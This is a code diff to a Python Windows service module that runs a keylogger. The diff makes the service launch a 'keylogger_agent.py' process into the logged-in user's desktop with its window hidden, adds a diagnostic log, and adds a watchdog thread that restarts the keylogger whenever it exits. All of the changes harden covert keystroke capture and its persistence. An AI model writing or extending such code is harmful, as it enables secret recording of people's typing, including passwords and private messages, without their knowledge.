@@ -27,6 +27,16 @@ logger = logging.getLogger(__name__)
 _AGENT_SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger_agent.py")
 
 
+def _resolve_python_executable() -> str:
+    """Resolve a Python executable suitable for launching child agents."""
+    executable = sys.executable
+    if os.path.basename(executable).lower() == "pythonservice.exe":
+        candidate = os.path.join(os.path.dirname(executable), "python.exe")
+        if os.path.exists(candidate):
+            return candidate
+    return executable
+
+
 def _is_session_0() -> bool:
     """Return True when the current process is running in Windows Session 0."""
     try:
@@ -75,13 +85,21 @@ def _spawn_agent_in_user_session(log_file: str):
             win32api.CloseHandle(user_token)
 
         # Escape any double-quotes in paths before building the command string.
-        python_exe = sys.executable.replace('"', '\\"')
+        os.makedirs(config.LOGS_DIR, exist_ok=True)
+        diag_log_file = os.path.join(config.LOGS_DIR, "keyboard_agent.log")
+
+        python_exe = _resolve_python_executable().replace('"', '\\"')
         agent_script = _AGENT_SCRIPT.replace('"', '\\"')
         log_file_esc = log_file.replace('"', '\\"')
-        cmd = f'"{python_exe}" "{agent_script}" "{log_file_esc}"'
+        diag_log_file_esc = diag_log_file.replace('"', '\\"')
+        cmd = (
+            f'"{python_exe}" "{agent_script}" '
+            f'"{log_file_esc}" "{diag_log_file_esc}"'
+        )
         startup = win32process.STARTUPINFO()
         startup.dwFlags = win32con.STARTF_USESHOWWINDOW
         startup.wShowWindow = win32con.SW_HIDE
+        startup.lpDesktop = "winsta0\\default"
 
         try:
             proc_info = win32process.CreateProcessAsUser(
@@ -117,6 +135,8 @@ class KeyboardMonitor:
     def __init__(self):
         self._listener: keyboard.Listener | None = None
         self._agent_handle = None          # win32 process handle (Session 0 mode)
+        self._agent_lock = threading.Lock()
+        self._agent_watchdog_thread: threading.Thread | None = None
         self._buffer: list[str] = []
         self._lock = threading.Lock()
         self._flush_thread: threading.Thread | None = None
@@ -132,9 +152,17 @@ class KeyboardMonitor:
             logger.info(
                 "KeyboardMonitor: detected Session 0, spawning user-session agent"
             )
-            self._agent_handle = _spawn_agent_in_user_session(config.KEYBOARD_LOG_FILE)
-            if self._agent_handle is not None:
+            handle = _spawn_agent_in_user_session(config.KEYBOARD_LOG_FILE)
+            if handle is not None:
+                with self._agent_lock:
+                    self._agent_handle = handle
                 self._using_agent = True
+                self._agent_watchdog_thread = threading.Thread(
+                    target=self._agent_watchdog_loop,
+                    daemon=True,
+                    name="keyboard-agent-watchdog",
+                )
+                self._agent_watchdog_thread.start()
                 logger.info("KeyboardMonitor started (user-session agent)")
             else:
                 logger.warning(
@@ -161,20 +189,24 @@ class KeyboardMonitor:
 
     def stop(self):
         self._stop_event.set()
-        if self._using_agent and self._agent_handle is not None:
-            handle = self._agent_handle
-            self._agent_handle = None
-            try:
-                import win32process
-                import win32api
+        if self._using_agent:
+            with self._agent_lock:
+                handle = self._agent_handle
+                self._agent_handle = None
+            if handle is not None:
                 try:
-                    win32process.TerminateProcess(handle, 0)
+                    import win32process
+                    import win32api
+                    try:
+                        win32process.TerminateProcess(handle, 0)
+                    except Exception as exc:
+                        logger.debug("Error terminating keyboard agent: %s", exc)
+                    finally:
+                        win32api.CloseHandle(handle)
                 except Exception as exc:
-                    logger.debug("Error terminating keyboard agent: %s", exc)
-                finally:
-                    win32api.CloseHandle(handle)
-            except Exception as exc:
-                logger.debug("Error cleaning up keyboard agent handle: %s", exc)
+                    logger.debug("Error cleaning up keyboard agent handle: %s", exc)
+            if self._agent_watchdog_thread:
+                self._agent_watchdog_thread.join(timeout=5)
         if self._listener:
             try:
                 self._listener.stop()
@@ -184,6 +216,53 @@ class KeyboardMonitor:
             self._flush_thread.join(timeout=10)
         self._flush()
         logger.info("KeyboardMonitor stopped")
+
+    def _agent_watchdog_loop(self):
+        """Respawn the keylogger agent if it exits unexpectedly."""
+        try:
+            import win32event
+            import win32process
+            import win32api
+        except ImportError:
+            return
+
+        while not self._stop_event.wait(10):
+            with self._agent_lock:
+                handle = self._agent_handle
+            if handle is None:
+                continue
+
+            status = win32event.WaitForSingleObject(handle, 0)
+            if status != win32event.WAIT_OBJECT_0:
+                continue
+
+            try:
+                exit_code = win32process.GetExitCodeProcess(handle)
+            except Exception:
+                exit_code = -1
+
+            try:
+                win32api.CloseHandle(handle)
+            except Exception:
+                pass
+
+            with self._agent_lock:
+                if self._agent_handle is handle:
+                    self._agent_handle = None
+
+            if self._stop_event.is_set():
+                break
+
+            logger.warning(
+                "Keyboard agent exited unexpectedly (code %s); attempting restart",
+                exit_code,
+            )
+            new_handle = _spawn_agent_in_user_session(config.KEYBOARD_LOG_FILE)
+            if new_handle is not None:
+                with self._agent_lock:
+                    self._agent_handle = new_handle
+            else:
+                logger.warning("Keyboard agent restart failed; will retry")
 
     # ------------------------------------------------------------------
     # Internal helpers
